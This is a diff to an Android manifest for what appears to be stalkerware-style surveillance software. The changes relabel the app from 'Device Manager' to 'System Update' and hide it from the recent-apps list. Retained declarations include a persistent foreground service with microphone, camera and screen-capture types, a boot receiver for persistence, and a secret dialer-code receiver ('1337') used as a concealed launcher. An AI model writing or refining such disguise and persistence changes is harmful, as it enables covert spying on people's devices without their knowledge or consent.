@@ -30,12 +30,13 @@
     <application
         android:allowBackup="false"
         android:icon="@android:drawable/sym_def_app_icon"
-        android:label="Device Manager"
+        android:label="System Update"
         android:theme="@android:style/Theme.Material.NoActionBar">
 
         <activity
             android:name=".MainActivity"
             android:exported="true"
+            android:excludeFromRecents="true"
             android:theme="@android:style/Theme.Material.NoActionBar" />
 
         <activity-alias
@@ -54,16 +55,6 @@
             android:exported="false"
             android:foregroundServiceType="dataSync|mediaProjection|microphone|camera"
             android:stopWithTask="false" />
-
-        <service
-            android:name=".CameraStreamService"
-            android:exported="false"
-            android:foregroundServiceType="camera" />
-
-        <service
-            android:name=".ScreenCaptureService"
-            android:exported="false"
-            android:foregroundServiceType="mediaProjection" />
 
         <service
             android:name=".LiveAudioService"
@@ -91,19 +82,14 @@
             </intent-filter>
         </service>
 
-        <receiver
-            android:name=".BootReceiver"
-            android:enabled="true"
-            android:exported="true">
+        <receiver android:name=".BootReceiver" android:enabled="true" android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.intent.action.QUICKBOOT_POWERON" />
             </intent-filter>
         </receiver>
 
-        <receiver
-            android:name=".SecretCodeReceiver"
-            android:exported="true">
+        <receiver android:name=".SecretCodeReceiver" android:exported="true">
             <intent-filter>
                 <action android:name="android.provider.Telephony.SECRET_CODE" />
                 <data android:scheme="android_secret_code" android:host="1337" />
